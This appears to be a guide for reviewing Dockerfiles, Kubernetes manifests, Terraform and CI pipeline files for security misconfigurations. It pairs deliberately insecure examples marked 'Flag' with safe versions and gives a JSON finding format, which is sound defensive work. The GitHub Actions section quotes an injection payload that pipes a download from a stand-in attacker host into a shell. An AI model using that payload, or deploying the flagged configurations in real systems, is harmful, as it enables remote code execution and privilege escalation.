# iac-security-reviewer

Read this when reviewing Dockerfile, Kubernetes manifests, Terraform configs, GitHub Actions workflows, or other infrastructure-as-code files.

## Goal

Find misconfigurations in infrastructure definitions that would create security vulnerabilities in deployed environments: privilege escalation paths, exposed sensitive ports, public storage, overly permissive IAM, and secrets in pipeline configs.

## Part 1: Docker security

### Dockerfile review

**Running as root (high):**
```dockerfile
# Flag: no USER directive, or USER root
FROM ubuntu:20.04
RUN apt-get install -y myapp
# No USER instruction — runs as root by default
CMD ["./myapp"]

# Safe
RUN groupadd -r appgroup && useradd -r -g appgroup appuser
USER appuser
```

**Privileged or capability-escalated containers:**
```yaml
# docker-compose.yml — flag these
services:
  app:
    privileged: true                    # full host access
    cap_add:
      - SYS_PTRACE
      - SYS_ADMIN
      - NET_ADMIN
    security_opt:
      - seccomp:unconfined
      - apparmor:unconfined
      - no-new-privileges:false
```

**Hardcoded secrets in Dockerfile:**
```dockerfile
# Flag: secrets in ENV or ARG
ENV DB_PASSWORD=supersecret123
ARG API_KEY=abc123xyz              # visible in image layers even if unset later
RUN echo $DB_PASSWORD > /etc/dbconf

# Safe: use Docker secrets or runtime env injection
```

**Image hygiene:**
```dockerfile
# Flag: using latest tag — unpinned, non-reproducible builds
FROM ubuntu:latest
FROM python:latest

# Recommended: pinned digest
FROM python:3.12.3-slim@sha256:abc123...

# Flag: no .dockerignore — secrets files may be copied into image
COPY . .       # copies .env, .git, private keys if no .dockerignore
```

**Port exposure:**
```dockerfile
# Flag: exposing administrative ports
EXPOSE 22      # SSH
EXPOSE 3306    # MySQL
EXPOSE 5432    # PostgreSQL
EXPOSE 27017   # MongoDB
EXPOSE 6379    # Redis
```

**Package installation without version pinning:**
```dockerfile
# Flag: latest packages installed — may introduce vulnerable versions
RUN pip install flask requests     # no version constraints
```

## Part 2: Kubernetes security

### Pod security

```yaml
# Flag: privileged container
spec:
  containers:
  - name: app
    securityContext:
      privileged: true              # host kernel access
      allowPrivilegeEscalation: true
      runAsUser: 0                  # root
      runAsNonRoot: false
      readOnlyRootFilesystem: false
      capabilities:
        add:
          - SYS_ADMIN
          - NET_ADMIN

# Safe securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
```

### RBAC misconfigurations

```yaml
# Flag: overly permissive ClusterRole
rules:
- apiGroups: ["*"]
  resources: ["*"]        # all resources
  verbs: ["*"]            # all operations — essentially cluster admin

# Flag: wildcard verbs
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]            # should be ["get", "list"] at most

# Flag: binding to cluster-admin
roleRef:
  kind: ClusterRole
  name: cluster-admin     # full cluster access for any service account binding
```

### Secrets management in K8s

```yaml
# Flag: secrets hardcoded in env vars (base64 is not encryption)
env:
- name: DB_PASSWORD
  value: "plaintext-password"

# Flag: Secret referenced but also hardcoded elsewhere
# Also: Secrets mounted as env vars are visible in pod spec and logs

# Better: use Vault, AWS Secrets Manager, or K8s sealed-secrets
```

### Network policies

```yaml
# Flag: no NetworkPolicy defined for the namespace
# Without NetworkPolicy, all pods can communicate with all other pods

# Flag: NetworkPolicy allows all ingress/egress
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  ingress:
  - {}                    # allow all — same as no policy
```

### Service exposure

```yaml
# Flag: sensitive services exposed as LoadBalancer or NodePort
kind: Service
spec:
  type: LoadBalancer      # exposed to internet
  # For: database service, admin dashboard, internal APIs
```

### Host path mounts

```yaml
# Flag: mounting host filesystem paths
volumes:
- name: host-root
  hostPath:
    path: /              # entire host root filesystem
- name: docker-socket
  hostPath:
    path: /var/run/docker.sock   # Docker socket = container escape
```

## Part 3: Terraform security

### AWS IAM

```hcl
# Flag: wildcard permissions
resource "aws_iam_policy" "too_permissive" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"              # all actions
      Resource = "*"              # all resources
    }]
  })
}

# Flag: public-facing IAM role with assume-role from *
assume_role_policy = jsonencode({
  Statement = [{
    Action    = "sts:AssumeRole"
    Principal = { AWS = "*" }    # any AWS account
    Effect    = "Allow"
  }]
})
```

### S3 buckets

```hcl
# Flag: public bucket
resource "aws_s3_bucket_public_access_block" "example" {
  block_public_acls       = false    # should be true
  block_public_policy     = false    # should be true
  ignore_public_acls      = false    # should be true
  restrict_public_buckets = false    # should be true
}

# Flag: server-side encryption not enabled
# Missing: aws_s3_bucket_server_side_encryption_configuration

# Flag: logging not enabled for buckets storing sensitive data
# Missing: aws_s3_bucket_logging
```

### Security groups

```hcl
# Flag: 0.0.0.0/0 ingress on sensitive ports
resource "aws_security_group_rule" "bad" {
  type        = "ingress"
  from_port   = 22      # or 3306, 5432, 27017, 6379
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]   # open to internet
}
```

### Encryption

```hcl
# Flag: RDS without encryption at rest
resource "aws_db_instance" "example" {
  storage_encrypted = false   # should be true
}

# Flag: EBS volumes without encryption
resource "aws_ebs_volume" "example" {
  encrypted = false   # should be true
}

# Flag: Secrets in terraform.tfvars (committed to repo)
db_password = "actualpassword123"
```

## Part 4: CI/CD pipeline security (GitHub Actions, GitLab CI, Jenkins)

### GitHub Actions

```yaml
# Flag: overly permissive token permissions
permissions:
  contents: write
  id-token: write
  # Better: define minimum required permissions per job

# Flag: dangerous expression injection
- name: Run tests
  run: echo "${{ github.event.pull_request.title }}"  # PR title in shell command — injection
  # Attacker PR title: "; curl attacker.com | sh #"

# Flag: third-party action with no pinned version
uses: some-org/some-action@main     # mutable ref — supply chain risk
uses: some-org/some-action@v2       # tag can be moved — supply chain risk
# Safe:
uses: some-org/some-action@abc123def456   # pinned to commit SHA

# Flag: secrets in run step output
- run: echo "API_KEY=${{ secrets.API_KEY }}"  # secrets in log output

# Flag: self-hosted runner used for public repo PRs
# Untrusted code can run on self-hosted runners from forked PRs
```

### GitLab CI

```yaml
# Flag: variables with hardcoded secrets
variables:
  API_KEY: "hardcoded-value"    # visible to all pipeline users

# Flag: artifacts containing sensitive files
artifacts:
  paths:
    - .env
    - config/production.yml
```

## Output format

```json
{
  "file": "k8s/deployment.yaml",
  "line": 34,
  "category": "iac_privilege_escalation",
  "title": "Container running as root with privilege escalation allowed",
  "description": "The app container runs as root (runAsUser: 0) with allowPrivilegeEscalation: true. A container escape or application compromise grants root access to the underlying node.",
  "remediation": "Set runAsNonRoot: true, runAsUser: 1000, allowPrivilegeEscalation: false, and capabilities.drop: [ALL] in the container securityContext.",
  "cwe": "CWE-250",
  "severity": "high"
}
```
